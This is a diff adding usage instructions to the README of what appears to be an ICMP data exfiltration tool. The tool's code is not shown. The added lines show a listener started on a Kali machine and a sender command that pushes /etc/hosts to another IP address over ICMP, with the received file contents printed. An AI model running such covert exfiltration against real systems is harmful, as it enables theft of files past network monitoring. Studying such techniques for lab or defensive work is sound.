@@ -31,3 +31,27 @@ convert our data into "HEXADECIMAL" and send it to its destination.
 ```
 
 ### Usage
+#### icmp_exfiltration.py
+```bash
+❯ sudo python3 icmp_exfiltration.py vmnet8
+127.0.0.1       localhost
+127.0.1.1       kali
+
+# The following lines are desirable for IPv6 capable hosts
+::1     localhost ip6-localhost ip6-loopback
+ff02::1 ip6-allnodes
+ff02::2 ip6-allrouters                         
+```
+First we will run "icmp_exfiltration.py" file by specifying on which interface we want to listen.
+
+#### icmp_sendData.py
+```bash
+❯ python3 icmp_sendData.py 172.16.223.1 /etc/hosts
+
+[+] Trying to send file...
+
+[+] File sent successfully.                        
+```
+Then from another host we will run the "icmp_sendData.py" and the destination "IP-Address" and "FILE NAME"
+and it will automatically send  the file to another host terminal.
+
